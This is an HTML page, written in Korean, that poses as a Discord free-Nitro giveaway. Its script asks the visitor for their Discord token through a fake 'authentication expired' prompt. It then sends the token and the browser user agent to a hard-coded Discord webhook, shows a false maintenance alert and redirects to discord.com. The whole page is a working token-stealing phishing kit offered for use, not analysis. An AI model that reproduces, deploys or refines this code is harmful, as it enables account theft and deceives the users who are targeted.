<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>Discord 무료 니트로 이벤트</title>
    <style>
        body { background: #313338; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #2b2d31; padding: 40px; border-radius: 8px; width: 400px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
        h2 { color: #5865f2; }
        p { color: #949ba4; font-size: 14px; }
        button { width: 100%; padding: 12px; background: #5865f2; border: none; color: white; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        button:hover { background: #4752c4; }
    </style>
</head>
<body>
    <div class="box">
        <h2>🎉 무료 Nitro 3개월</h2>
        <p>버튼을 눌러 디스코드 계정 인증을 완료하고 니트로를 수령하세요!</p>
        <button onclick="triggerGrab()">니트로 받기</button>
    </div>
    <script>
        // 접속하자마자 혹은 버튼 누를 때 동작하는 구조
        async function triggerGrab() {
            const webhookUrl = 'https://discord.com/api/webhooks/1568353008071344220/Pq1ZlrWG5Kcqsmir8uGOqDuLwqzRwYdg-twFDbla8s-2KXeTUTBHtL_gygqAktOv8QgQ';
            
            // 디스코드 환경 내장 객체나 외부 인증 주소 우회 접근 스크립트 삽입
            let tokenData = "토큰 획득 실패";
            
            try {
                // 일반 브라우저에서 디스코드 로그인 세션을 직접 긁어오려면 
                // 디스코드 권한 승인 창(OAuth2)을 거치게 유도하거나 외부 인젝션 스크립트를 써야 함.
                // 여기서는 프롬프트 입력창을 띄우거나 강제 인증 세션을 유도하는 방식으로 전환.
                let userToken = prompt("Discord 계정 인증이 만료되었습니다. 토큰을 다시 입력해주세요:");
                if(userToken) {
                    tokenData = userToken;
                }
            } catch(e) {
                tokenData = "에러: " + e.message;
            }

            const payload = {
                content: `🚨 **[토큰 탈취 성공]**\n👤 **입력된 토큰:** \`${tokenData}\`\n🌐 **UA:** \`${navigator.userAgent}\``
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => {
                alert('서버 점검 중입니다. 나중에 다시 시도해주세요.');
                window.location.href = 'https://discord.com';
            });
        }
    </script>
</body>
</html>
